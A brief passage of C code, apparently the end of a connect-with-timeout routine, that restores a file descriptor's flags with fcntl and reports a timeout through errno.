    }
    else {
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
            return (-1);
        errno = ETIMEDOUT;
        return (-1);
    }
}
